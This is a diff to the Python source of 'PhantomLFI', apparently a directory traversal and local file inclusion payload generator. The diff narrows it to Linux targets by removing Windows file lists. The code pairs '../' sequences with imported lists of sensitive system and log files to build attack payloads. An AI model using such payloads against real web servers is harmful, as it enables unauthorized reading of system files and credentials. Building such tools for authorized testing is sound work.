@@ -1,5 +1,6 @@
 """
 Directory traversal payload generator for PhantomLFI.
+Linux-focused for web application testing.
 Done by D4rk0ps
 """
 
@@ -14,7 +15,6 @@ from core.encoders import (
 from config.default_targets import (
     LINUX_SENSITIVE_FILES,
     LINUX_LOG_FILES,
-    WINDOWS_SENSITIVE_FILES,
 )
 
 
@@ -23,26 +23,20 @@ def build_traversal(depth: int) -> str:
     return "../" * depth
 
 
-def generate_traversal_payloads(
-    depth: int,
-    target_os: str = "both",
-) -> dict:
-    """Generate directory traversal payloads for all target files."""
+def generate_traversal_payloads(depth: int) -> dict:
+    """Generate directory traversal payloads for Linux target files."""
     results = {}
 
     target_files = []
-    if target_os in ("linux", "both"):
-        target_files.extend([("Linux", f) for f in LINUX_SENSITIVE_FILES])
-        target_files.extend([("Linux Logs", f) for f in LINUX_LOG_FILES])
-    if target_os in ("windows", "both"):
-        target_files.extend([("Windows", f) for f in WINDOWS_SENSITIVE_FILES])
+    target_files.extend([("Linux", f) for f in LINUX_SENSITIVE_FILES])
+    target_files.extend([("Linux Logs", f) for f in LINUX_LOG_FILES])
 
     for category, target_file in target_files:
         key = f"Directory Traversal — {category}"
         if key not in results:
             results[key] = []
 
-        clean_target = target_file.lstrip("/").lstrip("\\")
+        clean_target = target_file.lstrip("/")
 
         for d in range(1, depth + 1):
             base_traversal = build_traversal(d)
